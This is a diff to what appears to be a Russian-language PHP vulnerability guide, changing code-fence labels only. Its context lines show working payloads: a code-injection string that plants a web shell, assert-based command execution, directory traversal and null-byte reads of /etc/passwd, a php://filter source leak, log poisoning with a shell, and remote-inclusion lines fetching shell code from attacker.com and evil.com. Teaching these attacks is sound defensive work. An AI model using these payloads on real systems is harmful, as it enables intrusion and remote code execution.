@@ -123,7 +123,7 @@ assert($debug); // В PHP < 7.2 исполняет код
 ```
 
 2. **Загрузка веб-шелла:**
-```http
+```bash
 ?page=x');file_put_contents('shell.php','<?php system($_GET[cmd]);?>');//
 Создастся файл shell.php, затем доступ: shell.php?cmd=whoami
 ```
@@ -136,7 +136,7 @@ assert($debug); // В PHP < 7.2 исполняет код
 ```
 
 4. **Эксплуатация через assert() в debug endpoints:**
-```http
+```bash
 ?debug=system('cat /etc/passwd')
 Выполнится: assert("system('cat /etc/passwd')");
 В PHP < 7.2 это выполнит команду
@@ -183,20 +183,20 @@ require($page . '.php'); // Намерение: home.php
 **A) LFI (Local File Inclusion) - чтение локальных файлов:**
 
 1. **Directory Traversal - чтение системных файлов:**
-```http
+```bash
 ?lang=../../../../etc/passwd
 Выполнится: include("languages/../../../../etc/passwd.php")
 Прочитает /etc/passwd (даже с .php в конце, если файл текстовый)
 ```
 
 2. **Null Byte Injection (PHP < 5.3.4):**
-```http
+```bash
 ?lang=../../../../etc/passwd%00
 %00 обрезает строку, игнорируя .php после него
 ```
 
 3. **Использование PHP Wrappers для обхода:**
-```http
+```bash
 ?page=php://filter/read=convert.base64-encode/resource=index
 Получим base64 исходного кода index.php (обходит парсинг PHP)
 
@@ -221,7 +221,7 @@ curl -A "<?php system(\$_GET['cmd']); ?>" http://site.com/
 
 Требует настройки: `allow_url_include = On` (по умолчанию выключено)
 
-```http
+```bash
 ?page=http://attacker.com/shell.txt
 Загрузит и выполнит код с внешнего сервера
 
@@ -409,14 +409,14 @@ exec("mysqldump -u root -p'pass' $db > backup.sql");
 #### **RFI (Remote File Inclusion)**
 - Включение файлов с удаленных серверов
 - Требует `allow_url_include = On`
-```http
+```bash
 ?page=http://evil.com/shell.txt
 ```
 
 #### **LFI (Local File Inclusion)**
 - Включение локальных файлов
 - Обход с помощью `../` (Directory Traversal)
-```http
+```bash
 ?page=../../../etc/passwd
 ?page=php://filter/read=convert.base64-encode/resource=index.php
 ```
